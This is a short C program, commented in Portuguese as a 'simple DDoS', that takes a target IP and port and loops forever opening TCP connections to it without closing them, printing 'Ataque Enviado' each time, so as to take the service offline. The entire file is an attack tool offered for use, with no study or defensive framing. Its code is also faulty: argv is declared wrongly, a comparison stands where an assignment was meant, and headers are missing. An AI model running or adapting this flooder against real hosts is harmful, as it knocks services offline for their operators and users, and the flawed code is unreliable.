#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>
// Simples DDOS em C. 
// A logica eh nao encerrar a conexao enquanto o programa roda ate tirar o servico do ar.

int main (int argc, char **argv[]){

	int mysocket;
	int aconnect;

	int porta;
	porta = atoi(argv[2]); // transforma String em Inteiro

	char *destiny;
	destiny = argv[1];

	int i;
	i == 0;

	struct sockaddr_in alvo;

	while (true){

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	alvo.sin_family = AF_INET;
	alvo.sin_port = htons(porta);
	alvo.sin_addr.s_addr = inet_addr (destiny);

	aconnect = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);
	printf("Ataque Enviado\n");

}//while
}//main
